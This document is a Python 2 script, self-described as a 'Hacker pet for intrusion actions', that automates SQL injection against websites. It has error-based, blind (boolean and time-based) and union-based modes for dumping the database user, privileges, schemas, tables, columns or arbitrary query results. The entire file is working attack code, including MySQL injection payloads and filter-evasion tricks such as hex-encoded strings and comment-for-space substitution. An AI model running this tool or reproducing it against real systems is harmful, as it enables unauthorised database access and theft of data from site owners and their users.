#!/usr/bin/env python2
import re, sys, time, urllib, urllib2, urlparse, socket
import argparse

p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...' )
p.add_argument( '--upc' , metavar = 'FILE', type = argparse.FileType('r'), help = 'File with raw http request (tcp-data catched by sniffer)' )
p.add_argument( '-u' , '--url'     , metavar = 'URL'          , help = 'url of site (can contain >>value<<)'  )
p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send POST data use this var'       )
p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET'      )
p.add_argument( '-r' , '--referer' , metavar = 'REFERER'      , help = 'Referer header in request'            )
p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries'   )
p.add_argument( '-t' , '--sleep'   , metavar = 'SECONDS', type = int, help = 'Time to sleep between requests' )
p.add_argument( '-v' , '--verbose' , action  = 'append_const' , const = 1, default = []  , help = 'how much verbose should be output' )
p.add_argument( '-E' , '--engine'  , default = 'mysql', choices = ['mysql', 'postgres']  , help = 'engine of database'  )
p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
p.add_argument( '-T' , metavar = 'TABLE'    , help = 'table to use'    )
p.add_argument( '-U' , metavar = 'USERNAME' , help = 'username to use' )

g = p.add_mutually_exclusive_group( required=True )
g.add_argument( '-g' , '--get', choices = [ 'user', 'privs', 'dbs', 'tbls', 'cols' ], help = 'wich object to retrieve from database' )
g.add_argument( '--sql', metavar = 'SQL_QUERY', help = 'this query will be retrieved from database' )

sp = p.add_subparsers( help = 'Commands for piglet:' )
pp = sp.add_parser( 'error', help = 'error-based SQL dumper' )
pp.set_defaults( func = lambda : DError( args ).trun() )

pp = sp.add_parser( 'blind', help = 'blind-based SQL dumper' )
pp.add_argument( '-S', '--string', metavar = 'KEYWORD', help = 'Keyword which is located on page for True string' )
pp.add_argument( '--ftime', metavar = 'SECONDS', type = float, help = 'False time anser for time-based SQLi' )
pp.set_defaults( func = lambda : DBlind( args ).trun() )

pp = sp.add_parser( 'union', help = 'union-based SQL dumper' )
pp.set_defaults( func = lambda : DUnion( args ).trun() )

args = p.parse_args()

if args.upc and ( args.url or args.post or args.cookie or args.referer ):
    print '[E] usage of raw request through file excludes usage of any -u/-p/-c/-r args. All info already must be in file ;)'
    exit( 1 )

class API( object ):
    def __init__( self, args ):
        self.a = args
        self.a.upc = self.a.upc and self.a.upc.read()

    def log( self, lvl, msg, newline = True ):
        if lvl <= len( self.a.verbose ):
            sys.stdout.write( msg )
            if newline:
                sys.stdout.write( '\n' )
            sys.stdout.flush()


    def err( self, msg ):
        print msg
        exit( 1 )

    def raw_html( self, upc = None, get = None, post = None, cookie = None ):
        tsleep = 0.05
        for n_try in xrange( 5 ):   ## try five times to get url
            time.sleep( tsleep )
            if not upc:
                self.log( 2, "[D] request %s:\n\tGET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( n_try, get, post, cookie ) )

                heads = {}
                if self.a.referer:
                    heads[ 'Referer' ] = self.a.referer


                o = urllib2.build_opener( )
                r = urllib2.Request( get, post, heads )
                if cookie:
                    pass

                code, html = None, ""
                try:
                    stream = o.open( r, timeout = 15 )
                    code = stream.getcode()
                    html = stream.read()
                    self.log( 3, '[D] HTML SERVER ANSWER:\n' + html )
                except urllib2.HTTPError, e:
                    code = e.getcode()
                    html = e.read()
                    self.log( 3, '[D] HTML SERVER ANSWER:\n' + html )
                except urllib2.URLError, e:
                    code = None
                    tsleep   *= 2   ## double time to sleep
                    self.log( 0, '[E] TIME OUT --> sleeping for %s seconds...' % tsleep )

                if code is not None:
                    break               ## go out from for loop...

            else:  ## raw request
                m = re.search( 'host:\s*(.*)', upc, re.IGNORECASE )
                if m:
                    host = m.group( 1 ).strip()
                else:
                    host = urlparse.urlparse( upc.split()[ 1 ] ).hostname

                self.log( 1, "[i] RAW request to '%s'" % host )
                if 'connection: close' not in upc.lower():
                    self.log( 0, "[W] raw request haven't \"Connection: close\" it may slowdown requests!" )

                ## fixing Content-Length...
                if upc[ :4 ] == 'POST':
                    m = re.search( '\r\n\r\n(.*)$', upc, re.DOTALL )
                    if not m:
                        self.err( '[E] can\'t find payload in raw request' )
                    l = len( m.group( 1 ) )                                                                 ## take length of payload
                    upc = re.sub( r'(content-length:)\s*\d+', r'\1 %s' % l, upc, flags = re.IGNORECASE )    ## fix it

                self.log( 3, "[D] RAW request %s:\n-----\n%s\n-------\n" % ( n_try, upc ) )
                s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
                s.connect( ( host, 80 ) )
                s.send( upc )

                tmp = ''
                while True:
                    data = s.recv( 8192 )
                    if not data:
                        break
                    tmp += data

                self.log( 3, "[D] RAW response:\n-----\n%s\n-------\n" % tmp )
                return ( None, tmp )  ## TODO: parse tmp & return normal code...


        return ( code, html )


    def codes( self, val = r'\1' ):
        """ return:
            code             : code for url ( 200, 404, 401 ... )
            lcnt, wcnt, ccnt : line, word and char counts for page
        """
        dt = time.time()
        ccnt, wcnt, lcnt = None, None, None
        c, h = self.html( val )
        if c:
            ccnt = len( h )
            wcnt = len( h.split() )
            lcnt = len( h.split('\n') )

        dt = time.time() - dt  ## how long is request time ?
        return c, lcnt, wcnt, ccnt, dt

    def html( self, val = r'\1' ):
        if self.a.sleep:
            self.log( 1, "[i] sleeping for %s seconds..." % self.a.sleep )
            time.sleep( self.a.sleep )
        r = re.compile( r'>>(.*)<<' )
        vs = [ self.a.upc, self.a.url, self.a.post, self.a.cookie ]
        vs = map( lambda x: x and r.sub( val, x ), vs )
        return self.raw_html( upc = vs[ 0 ], get = vs[ 1 ], post = vs[ 2 ], cookie = vs[ 3 ] )

    def dval( self ):
        r = re.compile( r'>>(.*)<<' )
        vs = [ self.a.url, self.a.post, self.a.cookie ]
        vs = map( lambda x: x and r.search( x ), vs )
        vs = filter( lambda x: x, vs )
        return vs[ 0 ].group( 1 )

    def pval( self, val ):
        r = re.compile( r'>>(.*)<<' )
        vs = [ self.a.url, self.a.post, self.a.cookie ]
        vs = map( lambda x: x and r.sub( val, x ), vs )
        print "GET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( vs[ 0 ], vs[ 1 ], vs[ 2 ] )

    def trun( self ):
        """ call self.run() in try-except block
        """
        try:
            self.run()
        except KeyboardInterrupt, e:
            self.err( '[*] CTRL+C: bye-bye' )

    def get( self, sss ):
        """ method to retrieve sql
            It must prepare payload from sql expression and return result
        """
        self.err( 'Must be implemented in child classes' )

    def run( self ):
        """ standart usage of SQL + filtering
            for custom actions it must be overwritten...
        """
        g = self.a.get
        s = self.a.sql
        if g:
            sql_cnt = sql( g + '_cnt' )
            if sql_cnt is None:
                self.log( 0, '[i] SQL: %s' % sql( g ) )
                res = self.get( sql( g ) )
                self.log( 0, '[o] result: %s' % res )
            else:
                arr = []
                self.log( 0, '[i] searching for count of %s' % g )
                cnt = int( self.get( sql_cnt ) )
                self.log( 0, '[o] count for %s is %s' % ( g, cnt ) )
                for i in xrange( cnt ):
                    res = self.get( sql(g,i) )
                    self.log( 0, '[o] result[%s]: %s' % ( i, res ) )
                    arr.append( res )
                self.log( 0, '[o] final answer --> %s' % arr )
        elif s:
            self.log( 0, '[i] raw SQL: %s' % s )
            s = sql.prepare( s )
            self.log( 0, '[i] filtered SQL: %s' % s )
            res = self.get( s )
            self.log( 0, '[o] result: %s' % res )


class SQL( object ):
    arr = { 'mysql': {}, 'postgres': {} }
    arr[ 'mysql' ][ 'user'      ] = "SELECT USER()"
    arr[ 'mysql' ][ 'dbs'       ] = "SELECT schema_name FROM information_schema.schemata where schema_name != 'information_schema' LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'dbs_cnt'   ] = "SELECT count(schema_name) FROM information_schema.schemata where schema_name != 'information_schema'"
    arr[ 'mysql' ][ 'tbls'      ] = "SELECT table_name FROM information_schema.tables WHERE table_schema='%(db)s' LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'tbls_cnt'  ] = "SELECT count(table_name) FROM information_schema.tables WHERE table_schema='%(db)s'"
    arr[ 'mysql' ][ 'cols'      ] = "SELECT column_name FROM information_schema.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s' LIMIT %(i)s,1"
    arr[ 'mysql' ][ 'cols_cnt'  ] = "SELECT count(column_name) FROM information_schema.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s'"
    arr[ 'mysql' ][ 'privs'     ] = "SELECT privilege_type FROM information_schema.user_privileges WHERE grantee like '%(user)s' LIMIT %(i)s,1";
    arr[ 'mysql' ][ 'privs_cnt' ] = "SELECT count(privilege_type) FROM information_schema.user_privileges WHERE grantee like '%(user)s'";

    def __init__( self, args, eng ):
        self.a   = args
        self.eng = eng

    def my_hex( self, s ):
        l = map( lambda c: hex( ord( c ) )[ 2: ], s )
        return '0x' + ''.join( l )

    def prepare( self, s ):
        for c in self.a.avoid:
            if c == "'":
                r = re.compile( r"'((?:[^'\\]|\\.)*)'" )
                s = r.sub( lambda m: self.my_hex( m.group( 1 ) ), s )
            elif c == '`':
                s = s.replace( '`', '' )
            elif c == ' ':
                s = s.replace( ' ', '/**/' )

        return '(%s)' % s

    def __call__( self, name, i = 0 ):
        db, tbl, user = self.a.D, self.a.T, self.a.U
        if name in self.arr[ self.eng ]:
            s = self.arr[ self.eng ][ name ]
            return self.prepare( s % dict( db = db, tbl = tbl, user = user, i = i ) )
        else:
            return None


class DError( API ):
    """ error-based dumper
    """
    def get( self, sss ):
        if self.a.engine == 'mysql':
            sss = '''(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY MID((%s), FLOOR(RAND(0)*2), 64))''' % sss
            sss = sql.prepare( sss )
            sss = urllib.quote( sss ) ## TODO: move this to filter functionality
            c, h = self.html( sss )
            open( '/tmp/debug.htm', 'w' ).write( h )
            m = re.search( r"Duplicate entry '([^']*)' for key", h )
            return m and m.group( 1 )
        else:
            self.err( '[!] can''t use this method on "%s" engine' % self.a.engine )


class DUnion( API ):
    def get( self, sss ):
        sss = "CONCAT(0x424141414142,(%s),0x424141414142)" % sss
        sss = sql.prepare( sss )
        sss = urllib.quote_plus( sss ) ## TODO: move this to filter functionality
        c, h = self.html( sss )
        m = re.search( 'BAAAAB(.*)BAAAAB', h )
        return m and m.group( 1 )

    def run( self ):
        self.log( 0, "[W] remember to provide full payload and place to inject, for example: \"http://site.com/script.php?id=sfsdf' union select 1,2,>><<,4,5 --+\"" )
        API.run( self )  ## call standart process of retrieving SQL


class DBlind( API ):
    """ blind-based dumper
    """
    def dih( self, sss, s = 32, e = 126 ):
        while e - s > 0:
            m = ( e + s ) / 2
            tsss = '%s between(%s)and(%s)' % ( sss, s, m )
            self.log( 2, '[D] testing: %s' % tsss )

            _, l, _, _, dt = self.codes( tsss )
            

            if self.a.ftime:       ## time based SQLi
                if dt > self.a.ftime:
                    self.log( 2, '[D] answer time = %s sec. --> FALSE' % dt )
                    s, e = m + 1, e
                else:
                    self.log( 2, '[D] answer time = %s sec. --> TRUE' %dt )
                    s, e = s, m
            else:                ## usual blind SQLi
                if l == self.l404:
                    self.log( 2, '[D] testing: l = %5s --> FALSE'  % l )
                    s, e = m + 1, e
                elif l == self.l200:
                    self.log( 2, '[D] testing: l = %5s --> TRUE' % l )
                    s, e = s, m
                else:
                    self.err( '[E] l != 200  ||  l != 404' )

            self.log( 2, '[D] interval: [%s..%s]' % ( s, e ))
        return s


    def get( self, sss ):
        l = self.dih( urllib.quote( 'length((%s))' % sss ), s = 0, e = 1000 )             ## TODO: move this to filter functionality
        self.log( 1, '[i] length(%s)=%s' % ( sss, l ) )
        res = ''
        for i in xrange( l ):
            c = self.dih( urllib.quote( 'ascii(substring((%s),%s,1))' % ( sss, i+1 ) ) )  ## TODO: move this to filter functionality
            res += chr( c )
            self.log( 0, chr( c ), newline = False )
        self.log( 0, '' )

        return res


    def run( self ):
        t1 = self.codes( '2*2=4' )
        t2 = self.codes( '2*2=5' )
        if not self.a.ftime:
            self.log( 0, '[i] testing for TRUE/FALSE pages taking only lines count values...' )
            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s )' % t1 )
            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s )' % t2 )
            self.l200 = t1[ 1 ]   ## count of lines for normal answer
            self.l404 = t2[ 1 ]   ## count of lines for error/404 answer
            if self.l200 == self.l404:
                self.err( '[!] count for true and fales pages are equal! (%s == %s)' % (self.l200, self.l404) )
        else:
            self.log( 0, '[i] testing for TRUE/FALSE pages for time based SQLi...' )
            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s] )' % t1 )
            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s] )' % t2 )
            if not ( t1[ -1 ] < t2[ -1 ] and t2[ -1 ] > self.a.ftime ):
                self.err( '[!] can\'t determine TRUE/FALSE page by time' )

        API.run( self )       ## call standart process of retrieving SQL




sql = SQL( args, args.engine )
args.func()
